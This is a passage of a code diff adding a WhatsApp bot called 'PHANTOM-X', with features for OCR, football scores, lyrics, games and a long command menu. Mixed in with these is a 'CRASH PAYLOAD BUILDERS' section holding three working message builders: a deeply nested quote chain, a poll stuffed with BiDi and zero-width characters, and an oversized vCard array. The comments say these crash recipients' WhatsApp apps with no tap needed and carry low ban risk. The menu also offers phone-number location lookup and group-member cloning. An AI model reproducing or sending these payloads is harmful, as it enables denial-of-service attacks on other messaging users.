+        "- Handwritten text (cursive, block letters, messy, stylized, or informal handwriting)\n" +
+        "- Notes, captions, watermarks, labels, or any other characters\n\n" +
+        "Rules:\n" +
+        "1. Preserve original line breaks and layout as much as possible.\n" +
+        "2. If a word is unclear, make your best guess and mark it with [?] after the word.\n" +
+        "3. Do NOT add any explanation, commentary, or preamble — output ONLY the raw text.\n" +
+        "4. If there is absolutely no text in the image, respond with exactly: NO_TEXT_FOUND";
+
+    const base64 = imageBuffer.toString("base64");
+
+    // Try each Gemini vision model in order before giving up
+    if (GEMINI_KEY) {
+        const models = ["gemini-2.0-flash", "gemini-1.5-flash", "gemini-1.5-flash-8b"];
+        for (const model of models) {
+            try {
+                const body = JSON.stringify({
+                    contents: [{ parts: [
+                        { text: OCR_PROMPT },
+                        { inline_data: { mime_type: mimeType, data: base64 } },
+                    ]}],
+                    generationConfig: { temperature: 0.1 },
+                });
+                const text = await new Promise((resolve, reject) => {
+                    const req = https.request({
+                        hostname: "generativelanguage.googleapis.com",
+                        path: `/v1beta/models/${model}:generateContent?key=${GEMINI_KEY}`,
+                        method: "POST",
+                        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
+                    }, (res) => {
+                        let data = "";
+                        res.on("data", c => data += c);
+                        res.on("end", () => {
+                            try {
+                                const parsed = JSON.parse(data);
+                                const t = parsed?.candidates?.[0]?.content?.parts?.[0]?.text?.trim() || "";
+                                if (parsed?.error || !t) return reject(new Error(parsed?.error?.message || "Empty response"));
+                                resolve(t);
+                            } catch { reject(new Error("OCR parse failed")); }
+                        });
+                    });
+                    req.on("error", reject);
+                    req.write(body);
+                    req.end();
+                });
+                if (text === "NO_TEXT_FOUND") return "";
+                return text;
+            } catch (_) { /* try next model */ }
+        }
+    }
+    throw new Error("OCR unavailable — set GEMINI_API_KEY or GOOGLE_API_KEY to enable image text extraction");
+}
+
+// --- FOOTBALL HELPERS (ESPN unofficial API) ---
+const AUTO_REACT_EMOJIS = ["❤️", "🔥", "😂", "👍", "😍", "🎉", "💯", "🙏", "😎", "🤩"];
+
+async function getPLTable() {
+    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/standings");
+
+    // ESPN API can return data in several different structures — handle all of them
+    let entries = [];
+    if (Array.isArray(data.standings) && data.standings[0]?.entries?.length) {
+        entries = data.standings[0].entries;
+    } else if (data.children?.[0]?.standings?.entries?.length) {
+        entries = data.children[0].standings.entries;
+    } else if (data.standings?.entries?.length) {
+        entries = data.standings.entries;
+    } else if (Array.isArray(data.children)) {
+        for (const child of data.children) {
+            if (child.standings?.entries?.length) { entries = child.standings.entries; break; }
+        }
+    }
+
+    if (!entries.length) throw new Error("No standings data returned. The ESPN API may be temporarily unavailable.");
+
+    const stamp = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", dateStyle: "medium", timeStyle: "short" });
+    let text = `🏆 *Premier League Table*\n_updated ${stamp} (Africa/Lagos)_\n\n`;
+    for (let i = 0; i < Math.min(entries.length, 20); i++) {
+        const e = entries[i];
+        const stats = {};
+        for (const s of e.stats || []) stats[s.name] = s.displayValue ?? s.value;
+        const pts    = stats.points          ?? stats.pts ?? 0;
+        const played = stats.gamesPlayed     ?? stats.played ?? 0;
+        const gd     = stats.pointDifferential ?? stats.goalDifference ?? stats.gd ?? 0;
+        const gdStr  = (Number(gd) >= 0 ? "+" : "") + gd;
+        const rank   = String(i + 1).padStart(2, " ");
+        const name   = e.team.shortDisplayName || e.team.displayName;
+        text += `*${rank}.* ${name} — *${pts}pts*  (${played} GP, ${gdStr} GD)\n`;
+    }
+    return text.trim();
+}
+
+async function getLiveScores() {
+    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/scoreboard");
+    const events = data.events || [];
+    const stamp = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", dateStyle: "medium", timeStyle: "short" });
+    if (!events.length) return `⚽ *Premier League*\nno matches happening right now.\n_checked ${stamp}_`;
+    let text = `🔴 *Live / Today's PL Matches*\n_as of ${stamp} (Africa/Lagos)_\n\n`;
+    let n = 1;
+    for (const ev of events) {
+        const comp = ev.competitions?.[0];
+        const home = comp?.competitors?.find(c => c.homeAway === "home");
+        const away = comp?.competitors?.find(c => c.homeAway === "away");
+        const status = ev.status?.type?.shortDetail || ev.status?.type?.description || "";
+        const state  = ev.status?.type?.state;
+        const tag    = state === "in" ? "🔴" : state === "post" ? "✅" : "🕒";
+        text += `${tag} *${n++}.* ${home?.team?.shortDisplayName} *${home?.score ?? 0}* – *${away?.score ?? 0}* ${away?.team?.shortDisplayName}\n      _${status}_\n\n`;
+    }
+    return text.trim();
+}
+
+
+// Common club name aliases so short names like "man utd", "spurs" etc work
+const TEAM_NAME_ALIASES = {
+    "man utd": "manchester united", "man u": "manchester united", "mufc": "manchester united", "united": "manchester united",
+    "man city": "manchester city", "city": "manchester city", "mcfc": "manchester city",
+    "spurs": "tottenham", "thfc": "tottenham", "hotspur": "tottenham",
+    "wolves": "wolverhampton", "wanderers": "wolverhampton",
+    "villa": "aston villa", "avfc": "aston villa",
+    "saints": "southampton",
+    "foxes": "leicester",
+    "gunners": "arsenal", "afc": "arsenal",
+    "reds": "liverpool", "lfc": "liverpool",
+    "blues": "chelsea", "cfc": "chelsea",
+    "toffees": "everton", "efc": "everton",
+    "hammers": "west ham", "whu": "west ham",
+    "magpies": "newcastle", "nufc": "newcastle",
+    "bees": "brentford",
+    "baggies": "west brom",
+    "cherries": "bournemouth",
+};
+
+function resolveTeamAlias(input) {
+    const lower = input.toLowerCase().trim();
+    return TEAM_NAME_ALIASES[lower] || lower;
+}
+
+// Simple bigram similarity for fuzzy matching (handles typos like "chealse" → "chelsea")
+function bigramSimilarity(a, b) {
+    const bigrams = s => { const bg = new Set(); for (let i = 0; i < s.length - 1; i++) bg.add(s.slice(i, i + 2)); return bg; };
+    const bgA = bigrams(a), bgB = bigrams(b);
+    let intersect = 0;
+    for (const bg of bgA) if (bgB.has(bg)) intersect++;
+    return (2 * intersect) / (bgA.size + bgB.size || 1);
+}
+
+async function findPLTeam(teamName) {
+    const search = resolveTeamAlias(teamName);
+    const teamsData = await fetchJSON("https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams");
+    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
+    // First try exact includes match
+    let found = teams.find(t => {
+        const dn  = (t.team.displayName || "").toLowerCase();
+        const sdn = (t.team.shortDisplayName || "").toLowerCase();
+        const nn  = (t.team.nickname || "").toLowerCase();
+        const loc = (t.team.location || "").toLowerCase();
+        const abbr = (t.team.abbreviation || "").toLowerCase();
+        return dn.includes(search) || sdn.includes(search) || nn.includes(search) || loc.includes(search) || abbr === search;
+    });
+    if (found) return found;
+    // Fuzzy fallback — pick highest bigram similarity if score > 0.4
+    let best = null, bestScore = 0.4;
+    for (const t of teams) {
+        const names = [t.team.displayName, t.team.shortDisplayName, t.team.location, t.team.nickname].filter(Boolean).map(n => n.toLowerCase());
+        const score = Math.max(...names.map(n => bigramSimilarity(search, n)));
+        if (score > bestScore) { bestScore = score; best = t; }
+    }
+    return best || null;
+}
+
+async function getClubFixtures(teamName) {
+    const team = await findPLTeam(teamName);
+    if (!team) return null;
+    const id = team.team.id;
+    const sched = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams/${id}/schedule`);
+    const events = sched.events || [];
+    const upcoming = events.filter(e => e.competitions?.[0]?.status?.type?.state !== "post").slice(0, 5);
+    const past = events.filter(e => e.competitions?.[0]?.status?.type?.state === "post").slice(-3);
+    const stamp = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", dateStyle: "medium", timeStyle: "short" });
+    let text = `⚽ *${team.team.displayName}*\n_fixtures & results — ${stamp} (Africa/Lagos)_\n`;
+    if (past.length) {
+        text += "\n*recent results*\n";
+        let n = 1;
+        for (const ev of past) {
+            const comp = ev.competitions?.[0];
+            const home = comp?.competitors?.find(c => c.homeAway === "home");
+            const away = comp?.competitors?.find(c => c.homeAway === "away");
+            text += `*${n++}.* ${home?.team?.shortDisplayName} *${home?.score}* – *${away?.score}* ${away?.team?.shortDisplayName}\n`;
+        }
+    }
+    if (upcoming.length) {
+        text += "\n*upcoming*\n";
+        let n = 1;
+        for (const ev of upcoming) {
+            const date = new Date(ev.date).toLocaleString("en-NG", { weekday: "short", day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
+            const comp = ev.competitions?.[0];
+            const home = comp?.competitors?.find(c => c.homeAway === "home");
+            const away = comp?.competitors?.find(c => c.homeAway === "away");
+            text += `*${n++}.* ${home?.team?.shortDisplayName} vs ${away?.team?.shortDisplayName}\n      _${date}_\n`;
+        }
+    }
+    if (!past.length && !upcoming.length) text += "\nno fixtures found.";
+    return text.trim();
+}
+
+// --- SONG SEARCH (iTunes API, free, no key) ---
+async function searchSongs(query) {
+    const encoded = encodeURIComponent(query);
+    const data = await fetchJSON(`https://itunes.apple.com/search?term=${encoded}&entity=song&limit=6`);
+    return data.results || [];
+}
+
+// --- LYRICS (lrclib.net — free, no key, reliable) ---
+async function getLyrics(artist, title) {
+    // Try lrclib.net first (most reliable free lyrics API)
+    try {
+        const data = await fetchJSON(`https://lrclib.net/api/search?track_name=${encodeURIComponent(title)}&artist_name=${encodeURIComponent(artist)}`);
+        const results = Array.isArray(data) ? data : [];
+        const match = results.find(r => r.plainLyrics) || results[0];
+        if (match?.plainLyrics) return match.plainLyrics;
+    } catch (_) {}
+    // Fallback to lyrics.ovh
+    try {
+        const data = await fetchJSON(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`);
+        if (data.lyrics) return data.lyrics;
+    } catch (_) {}
+    return null;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// ░░░░░  CRASH PAYLOAD BUILDERS  ░░░░░
+// ─────────────────────────────────────────────────────────────────────────────
+
+// TECHNIQUE 1 — Deep Nested Quote Chain
+// Builds a message quoted inside a quote inside a quote … N levels deep.
+// WhatsApp recursively loads every quoted level the moment the chat scrolls
+// to that message.  18 levels overflows the renderer's call-stack → force close.
+// Sends as ONE message.  Very low ban risk.
+function buildDeepQuoteChain(depth = 18) {
+    const zw = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f";
+    let inner = waProto.Message.fromObject({ conversation: zw.repeat(3000) });
+    for (let i = 0; i < depth; i++) {
+        inner = waProto.Message.fromObject({
+            extendedTextMessage: {
+                text: zw.repeat(400) + "\u202e" + zw.repeat(400),
+                contextInfo: {
+                    stanzaId: Math.random().toString(36).slice(2, 14),
+                    participant: "0@s.whatsapp.net",
+                    quotedMessage: inner
+                }
+            }
+        });
+    }
+    return inner;
+}
+
+// TECHNIQUE 2 — Poll Bomb
+// Sends a pollCreationMessage with 12 options each carrying max-length text
+// stuffed with BiDi + zero-width control chars.  WhatsApp auto-renders polls
+// the instant they appear in chat — no tap needed.  The poll renderer runs out
+// of memory → crash.  Sends as ONE message.  Low ban risk.
+function buildPollCrashMsg() {
+    const bidi = "\u202e\u202d\u202c\u202b\u202a\u2066\u2067\u2068\u2069";
+    const zw   = "\u200b\u200c\u200d\u2060\ufeff";
+    const fill = bidi.repeat(60) + zw.repeat(80) + "X".repeat(700) + bidi.repeat(60);
+    const options = [];
+    for (let i = 0; i < 12; i++) {
+        options.push({ optionName: fill + String(i) });
+    }
+    return waProto.Message.fromObject({
+        pollCreationMessage: {
+            name: bidi.repeat(120) + "Poll" + bidi.repeat(120),
+            options,
+            selectableOptionsCount: 0
+        }
+    });
+}
+
+// TECHNIQUE 3 — vCard Array Bomb
+// Sends a contactsArrayMessage containing 50 contacts each with a ~5 KB
+// malformed vCard body.  WhatsApp auto-parses every contact card on delivery
+// (no tap needed).  Parsing 50 oversized cards simultaneously exhausts the
+// contact-parser → crash.  Sends as ONE message.  Low ban risk.
+function buildVCardCrashMsg() {
+    const contacts = [];
+    for (let i = 0; i < 50; i++) {
+        const pad = String(i).padStart(12, "0");
+        const vcard =
+            `BEGIN:VCARD\nVERSION:3.0\n` +
+            `FN:${"X".repeat(1500)}\n` +
+            `TEL;type=CELL;type=VOICE;waid=${pad}:+${pad}\n` +
+            `EMAIL:${"a".repeat(900)}@phantom.x\n` +
+            `NOTE:${"Z".repeat(2500)}\n` +
+            `END:VCARD`;
+        contacts.push({ vcard, displayName: "X".repeat(60) });
+    }
+    return waProto.Message.fromObject({
+        contactsArrayMessage: { contacts, displayName: "Contacts" }
+    });
+}
+
+// --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
+function buildImageGenUrl(prompt) {
+    return `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=768&height=768&nologo=true&model=flux&safe=false`;
+}
+
+// --- SCREENSHOT (thum.io, free, no key) ---
+function buildScreenshotUrl(url) {
+    if (!url.startsWith("http")) url = "https://" + url;
+    return `https://image.thum.io/get/width/1280/crop/800/${url}`;
+}
+
+// --- GAME STATE ---
+const gameState = {}; // { chatJid: { type, board, players, turn, ... } }
+
+function renderTTTBoard(board) {
+    const symbols = { "X": "❌", "O": "⭕", "": "⬜" };
+    return [
+        `${symbols[board[0]]}${symbols[board[1]]}${symbols[board[2]]}`,
+        `${symbols[board[3]]}${symbols[board[4]]}${symbols[board[5]]}`,
+        `${symbols[board[6]]}${symbols[board[7]]}${symbols[board[8]]}`,
+    ].join("\n") + "\n\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣";
+}
+
+function checkTTTWin(board, mark) {
+    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+    return wins.some(([a,b,c]) => board[a] === mark && board[b] === mark && board[c] === mark);
+}
+
+function tttBestBotMove(board) {
+    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+    const empty = board.map((v,i)=>v?null:i).filter(v=>v!==null);
+    const findLine = (mark) => {
+        for (const line of wins) {
+            const vals = line.map(i => board[i]);
+            if (vals.filter(v => v === mark).length === 2 && vals.filter(v => !v).length === 1) {
+                return line[vals.findIndex(v => !v)];
+            }
+        }
+        return null;
+    };
+    return findLine("O") ?? findLine("X") ?? (board[4] ? null : 4) ?? [0,2,6,8].find(i => !board[i]) ?? empty[0];
+}
+
+const TRUTHS = [
+    "What is the most embarrassing thing you've ever done?",
+    "What is your biggest fear?",
+    "Have you ever lied to get out of trouble?",
+    "What is something you've never told anyone?",
+    "What is the worst thing you've ever done?",
+    "Who do you have a crush on right now?",
+    "What is your most used app on your phone?",
+    "Have you ever cheated on a test?",
+    "What is your biggest regret?",
+    "What is the strangest dream you've ever had?",
+];
+
+const DARES = [
+    "Send a voice note singing any song for 10 seconds.",
+    "Change your WhatsApp status to something embarrassing for 10 minutes.",
+    "Send a selfie right now.",
+    "Call someone in this group and sing happy birthday.",
+    "Write a love letter to the person above you in this chat.",
+    "Send your last 3 emojis you used.",
+    "Post your last Google search.",
+    "Do 20 push-ups and send a video proof.",
+    "Let someone else send one message from your phone.",
+    "Speak in rhymes for your next 3 messages.",
+];
+
+// --- THIS WEEK'S PL MATCHES ---
+async function getPLWeekMatches() {
+    const now = new Date();
+    const weekEnd = new Date(now.getTime() + 7 * 24 * 3600 * 1000);
+    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/scoreboard?limit=50");
+    const events = data.events || [];
+    if (!events.length) return "📅 No Premier League matches found for this week.";
+    const weekEvents = events.filter(ev => {
+        const d = new Date(ev.date);
+        return d >= now && d <= weekEnd;
+    });
+    const allEvents = weekEvents.length ? weekEvents : events.slice(0, 10);
+    const stamp = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos", dateStyle: "medium", timeStyle: "short" });
+    let text = `📅 *PL — This Week's Matches*\n_as of ${stamp} (Africa/Lagos)_\n\n`;
+    let n = 1;
+    for (const ev of allEvents) {
+        const comp = ev.competitions?.[0];
+        const home = comp?.competitors?.find(c => c.homeAway === "home");
+        const away = comp?.competitors?.find(c => c.homeAway === "away");
+        const dateStr = new Date(ev.date).toLocaleString("en-NG", { weekday: "short", day: "numeric", month: "short", hour: "2-digit", minute: "2-digit", timeZone: "Africa/Lagos" });
+        const status = ev.status?.type?.state;
+        if (status === "post") {
+            text += `✅ *${n}.* ${home?.team?.shortDisplayName} *${home?.score}-${away?.score}* ${away?.team?.shortDisplayName}\n      _${dateStr}_\n\n`;
+        } else if (status === "in") {
+            text += `🔴 *${n}.* ${home?.team?.shortDisplayName} *${home?.score}-${away?.score}* ${away?.team?.shortDisplayName} _(LIVE)_\n      _${dateStr}_\n\n`;
+        } else {
+            text += `⚽ *${n}.* ${home?.team?.shortDisplayName} vs ${away?.team?.shortDisplayName}\n      _${dateStr}_\n\n`;
+        }
+        n++;
+    }
+    if (!allEvents.length) text += "no matches found this week.";
+    return text.trim();
+}
+
+// --- HEAD TO HEAD (last match + upcoming match between two clubs) ---
+async function getH2H(teamA, teamB) {
+    const [tA, tB] = await Promise.all([findPLTeam(teamA), findPLTeam(teamB)]);
+    if (!tA) return { error: `Club "${teamA}" not found in Premier League.` };
+    if (!tB) return { error: `Club "${teamB}" not found in Premier League.` };
+    // Fetch both schedules and look for matches where both teams appear
+    const [schedA] = await Promise.all([
+        fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/teams/${tA.team.id}/schedule`),
+    ]);
+    const events = schedA.events || [];
+    const idB = tB.team.id;
+    // Find matches where the opponent is teamB
+    const h2hEvents = events.filter(ev => {
+        const comp = ev.competitions?.[0];
+        return comp?.competitors?.some(c => c.team?.id === idB);
+    });
+    const past = h2hEvents.filter(e => e.competitions?.[0]?.status?.type?.state === "post");
+    const upcoming = h2hEvents.filter(e => e.competitions?.[0]?.status?.type?.state === "pre");
+    const lastMatch = past[past.length - 1] || null;
+    const nextMatch = upcoming[0] || null;
+    let text = `⚽ *Head to Head: ${tA.team.displayName} vs ${tB.team.displayName}*\n━━━━━━━━━━━━━━━━━━━\n`;
+    if (lastMatch) {
+        const comp = lastMatch.competitions?.[0];
+        const home = comp?.competitors?.find(c => c.homeAway === "home");
+        const away = comp?.competitors?.find(c => c.homeAway === "away");
+        const dateStr = new Date(lastMatch.date).toLocaleDateString("en-NG", { weekday: "short", day: "numeric", month: "short", year: "numeric", timeZone: "Africa/Lagos" });
+        text += `\n🕘 *Last Meeting:*\n${home?.team?.displayName} *${home?.score}* - *${away?.score}* ${away?.team?.displayName}\n📅 ${dateStr}\n`;
+    } else {
+        text += `\n🕘 *Last Meeting:* No recent results found\n`;
+    }
+    if (nextMatch) {
+        const comp = nextMatch.competitions?.[0];
+        const home = comp?.competitors?.find(c => c.homeAway === "home");
+        const away = comp?.competitors?.find(c => c.homeAway === "away");
+        const dateStr = new Date(nextMatch.date).toLocaleDateString("en-NG", { weekday: "long", day: "numeric", month: "long", year: "numeric", timeZone: "Africa/Lagos" });
+        text += `\n📅 *Next Meeting:*\n${home?.team?.displayName} vs ${away?.team?.displayName}\n📅 ${dateStr}\n`;
+    } else {
+        text += `\n📅 *Next Meeting:* No upcoming fixture found\n`;
+    }
+    return { text };
+}
+
+async function getClubNews(teamName) {
+    const team = await findPLTeam(teamName);
+    if (!team) return null;
+    const id = team.team.id;
+    const newsData = await fetchJSON(`https://site.api.espn.com/apis/site/v2/sports/soccer/eng.1/news?team=${id}&limit=5`);
+    const articles = newsData.articles || [];
+    if (!articles.length) return `No recent news found for ${team.team.displayName}.`;
+    let text = `📰 *${team.team.displayName} — Latest News*\n━━━━━━━━━━━━━━━━━━━\n`;
+    for (const a of articles) {
+        const date = new Date(a.published).toLocaleDateString("en-NG", { day: "numeric", month: "short" });
+        text += `\n📌 *${a.headline}*\n_${date}_ — ${a.description || ""}\n`;
+    }
+    return text;
+}
+
+// --- MENU SECTIONS DATA ---
+function getMenuSections() {
+    return [
+        { emoji: '📋', title: 'GENERAL', items: [
+            ['.menu / .phantom'], ['.info'], ['.help'], ['.ping'],
+            ['.restart'], ['.menudesign 1-20'], ['.mode public/owner'],
+            ['.setmenupic / .setmenupic bug / .setmenupic owner'],
+            ['.delpp / .delpp bug / .delpp owner'],
+            ['.list'], ['.list group menu'], ['.help bug menu'],
+        ]},
+        { emoji: '🔑', title: 'DEV ACCESS CONTROL', items: [
+            ['.unleash allcmds — open all cmds to everyone'],
+            ['.unleash allcmds ‹number› — give one number full access'],
+            ['.unleash ‹cmd› all — open one cmd to everyone'],
+            ['.unleash ‹cmd› ‹number› — open one cmd for one number'],
+            ['.cmdlock allcmds — re-lock everything'],
+            ['.cmdlock ‹cmd› — re-lock one cmd'],
+            ['.lockfor ‹number› ‹cmd› — block cmd for number (overrides premium)'],
+            ['.lockfor ‹number› allcmds — block ALL cmds for number'],
+            ['.unlockfor ‹number› ‹cmd› — remove a specific block'],
+            ['.premiumadd ‹number›'], ['.premiumremove ‹number›'], ['.premiumlist'],
+            ['.adddev ‹number›'], ['.removedev ‹number›'], ['.devlist'],
+        ]},
+        { emoji: '⚠️', title: 'MODERATION', items: [
+            ['.warn @user'], ['.warnlist'], ['.resetwarn @user'],
+            ['.ban @user'], ['.unban @user'],
+        ]},
+        { emoji: '👥', title: 'GROUP MANAGEMENT', items: [
+            ['.add ‹number›'], ['.kick @user'], ['.promote @user'],
+            ['.demote @user'], ['.link'], ['.revoke'],
+            ['.lock'], ['.unlock'], ['.mute @user'], ['.unmute @user'], ['.groupinfo'],
+            ['.adminlist'], ['.tagadmin ‹msg›'], ['.membercount'], ['.everyone ‹msg›'],
+        ]},
+        { emoji: '🏷️', title: 'TAG & ANNOUNCE', items: [
+            ['.hidetag'], ['.tagall'], ['.readmore'],
+            ['.broadcast ‹mins› ‹message›'], ['.stopbroadcast'],
+            ['.schedule ‹HH:MM› ‹message›'], ['.unschedule ‹HH:MM›'], ['.schedules'],
+        ]},
+        { emoji: '⚙️', title: 'AUTOMATION', items: [
+            ['.autoreact on/off/emoji'], ['.autoreply add/remove/list'],
+            ['.setalias ‹word› ‹.cmd›'], ['.delalias ‹word›'], ['.aliases'],
+            ['.antidelete on/off'], ['.antibot on/off'],
+        ]},
+        { emoji: '🧠', title: 'AI & MEDIA', items: [
+            ['.ai ‹question›'], ['.imagine ‹prompt›'],
+            ['.solve (reply to image/text question)'],
+            ['.song ‹title›'], ['.lyrics ‹artist› | ‹title›'],
+            ['.ss ‹url›'], ['.viewonce'], ['.ocr'],
+            ['.translate ‹lang› ‹text›'], ['.weather ‹city›'],
+        ]},
+        { emoji: '🔍', title: 'UTILITIES', items: [
+            ['.calc ‹expression›'], ['.numinfo ‹number›'], ['.targetloc ‹number›'], ['.groupid'],
+            ['.listonline'], ['.listoffline'],
+            ['.bible'], ['.quran'],
+            ['.setstatus ‹text›'], ['.setname ‹name›'],
+        ]},
+        { emoji: '⚽', title: 'FOOTBALL (PL)', items: [
+            ['.pltable'], ['.live'], ['.plweek'],
+            ['.fixtures ‹club›'], ['.fnews ‹club›'],
+            ['.football ‹club›'], ['.h2h ‹club1› vs ‹club2›'],
+        ]},
+        { emoji: '🎮', title: 'GAMES', items: [
+            ['.ttt @p1 @p2'], ['.truth'], ['.dare'],
+            ['.wordchain ‹word›'], ['.flip'], ['.dice'],
+            ['.8ball ‹question›'], ['.rps rock/paper/scissors'],
+            ['.slots'], ['.trivia'], ['.hangman ‹guess›'],
+            ['.numguess'], ['.riddle'], ['.mathquiz'],
+            ['.wouldurather'], ['.scramble'],
+        ]},
+        { emoji: '😂', title: 'FUN', items: [
+            ['.joke'], ['.fact'], ['.quote'],
+            ['.roast @user'], ['.compliment @user'],
+            ['.ship @user1 @user2'], ['.rate @user'],
+            ['.vibe @user'], ['.horoscope ‹sign›'],
+        ]},
+        { emoji: '🛡️', title: 'GROUP PROTECTION', items: [
+            ['.antilink on/off'], ['.antispam on/off'],
+            ['.antidemote on/off'], ['.antibug on/off/status'],
+        ]},
+        { emoji: '📣', title: 'NOTIFICATIONS', items: [
+            ['.welcome on/off'], ['.goodbye on/off'],
+        ]},
+        { emoji: '🔄', title: 'GC CLONE', items: [
+            ['.clone ‹src› ‹dst› ‹batch› ‹mins›'], ['.stopclone'],
+        ]},
+        { emoji: '✏️', title: 'TEXT & STYLE EFFECTS', items: [
+            ['.zalgo ‹text›'], ['.bigtext ‹text›'],
+            ['.invisible'], ['.rtl ‹text›'],
+            ['.mock ‹text›'], ['.aesthetic ‹text›'],
+            ['.reverse ‹text›'], ['.clap ‹text›'],
+        ]},
+        { emoji: '🛠️', title: 'EXTRAS', items: [
+            ['.sticker'], ['.toimg'],
+            ['.qr ‹text›'], ['.genpwd ‹length›'],
+            ['.base64 encode/decode ‹text›'],
+            ['.chat ‹message›'], ['.autojoin on/off'],
+        ]},
+        { emoji: '⏰', title: 'PRODUCTIVITY', items: [
+            ['.remind ‹time› ‹text›'], ['.remind list / del ‹id›'],
+            ['.todo / .todo add ‹task›'], ['.todo done ‹n› / del ‹n›'],
+            ['.note save/get/del ‹name›'],
+            ['.timer ‹time› [label]'], ['.timer list / stop ‹id›'],
+            ['.countdown set ‹name› ‹YYYY-MM-DD›'], ['.countdown list / del'],
+            ['.calendar [year] [month]'],
+        ]},
+        { emoji: '🤖', title: 'AI EXTRA', items: [
+            ['.summarize (reply or text)'], ['.atranslate ‹text› ‹lang›'],
+            ['.codereview (reply to code)'], ['.code ‹what to build›'],
+            ['.explain ‹topic›'], ['.persona set/show/clear'],
+            ['.aichat ‹message›'],
+        ]},
+        { emoji: '🔊', title: 'TEXT-TO-SPEECH', items: [
+            ['.tts ‹text›'], ['.tts ‹lang› ‹text›'],
+            ['.voice ‹text›'], ['.tovn ‹text› (voice note)'],
+        ]},
+        { emoji: '🖼️', title: 'IMAGE EDITOR', items: [
+            ['.blur [amount]'], ['.invert'], ['.grayscale'],
+            ['.brighten [factor]'], ['.darken [factor]'], ['.sharpen [sigma]'],
+            ['.pixelate [amount]'], ['.cartoon'],
+            ['.removebg (needs API key)'], ['.upscale (needs API key)'],
+        ]},
+        { emoji: '🎮', title: 'GAMES EXTRA', items: [
+            ['.akinator'], ['.guessflag'], ['.math'],
+            ['.typingtest'], ['.connect4'], ['.werewolf'],
+        ]},
+        { emoji: '📥', title: 'MEDIA DOWNLOADER', items: [
+            ['.dl ‹url›'], ['.yt ‹url›'], ['.ytmp3 ‹url›'],
+            ['.tiktok / .tt ‹url›'], ['.ig ‹url›'], ['.fb ‹url›'],
+            ['.x ‹url›'], ['.sc ‹url›'], ['.pin ‹url›'],
+            ['.reddit / .tumblr / .vimeo / .twitch'],
+            ['.dlhealth (provider stats)'],
+        ]},
+        { emoji: '🚨', title: 'THREAT NETWORK', items: [
+            ['.report ‹num› [category] [note]'],
+            ['.threats (list)'], ['.threatinfo ‹num›'],
+            ['.unthreat ‹num›'],
+        ]},
+        { emoji: '📈', title: 'PROMO ENGINE', items: [
+            ['.promogroup status'], ['.promogroup setgroup ‹jid› ‹link›'],
+            ['.promogroup rate ‹n› / interval ‹h›'],
+            ['.promogroup on/off/pause/resume'],
+            ['.promogroup pool auto/manual'],
+            ['.promogroup add/remove/optout ‹num›'],
+            ['.promogroup runnow / reset'],
+        ]},
+    ];
+}
+
+// --- T12/T13: section banners + section list helpers ---
+function loadSectionBanners() { try { return JSON.parse(fs.readFileSync("menu_banners.json", "utf8")); } catch { return {}; } }
+function saveSectionBanners(d) { try { fs.writeFileSync("menu_banners.json", JSON.stringify(d, null, 2)); } catch {} }
+function getSectionBanner(idx) { return loadSectionBanners()[String(idx)] || null; }
+function setSectionBanner(idx, b64) { const d = loadSectionBanners(); d[String(idx)] = b64; saveSectionBanners(d); }
+function delSectionBanner(idx) { const d = loadSectionBanners(); delete d[String(idx)]; saveSectionBanners(d); }
+
+// Section indices that are dev-only. By title match.
+const DEV_ONLY_SECTIONS = ["DEV ACCESS CONTROL", "THREAT NETWORK", "PROMO ENGINE"];
+function isDevSection(title) { return DEV_ONLY_SECTIONS.includes(title); }
+
+function getVisibleSections(isDev) {
+    const all = getMenuSections();
+    return isDev ? all : all.filter(s => !isDevSection(s.title));
+}
+
+function buildSectionPicker(isDev, styleNum) {
+    const sections = getVisibleSections(isDev);
+    const time = new Date().toLocaleString("en-NG", { timeZone: "Africa/Lagos" });
+    const isStyle2 = Number(styleNum) === 2;
+    if (isStyle2) {
+        // Boxed/diamond style
+        let out = `╔══════════════════════╗\n`;
+        out += `║  💎  P H A N T O M - X  💎  ║\n`;
+        out += `╚══════════════════════╝\n`;
+        out += `🕓  ${time}\n`;
+        out += `📚  Pick a section: *.menu <number>*\n`;
+        out += `━━━━━━━━━━━━━━━━━━━\n`;
+        sections.forEach((s, i) => { out += `  *${String(i + 1).padStart(2, "0")}*  ${s.emoji}  *${s.title}*\n`; });
+        out += `━━━━━━━━━━━━━━━━━━━\n`;
+        out += `_Tap any: e.g._  *.menu 3*\n`;
+        out += `_Full menu:_  *.menu all*  •  _Style:_  *.menu style 1/2*`;
+        return out;
+    }
+    // Style 1 — sleek minimal
+    let out = `┏━━━━━━━━━━━━━━━━━━━┓\n`;
+    out += `   👻  *PHANTOM-X MENU*  👻\n`;
+    out += `┗━━━━━━━━━━━━━━━━━━━┛\n`;
+    out += `🕓 ${time}\n\n`;
+    out += `📂 *Sections* — reply *.menu <num>*\n`;
+    out += `─────────────────────\n`;
+    sections.forEach((s, i) => { out += `▸ *${i + 1}.* ${s.emoji} ${s.title}\n`; });
+    out += `─────────────────────\n`;
+    out += `_e.g._ *.menu 5*  •  *.menu all*  •  *.menu style 2*`;
+    return out;
+}
+
+function buildOneSectionText(sec, idx, styleNum) {
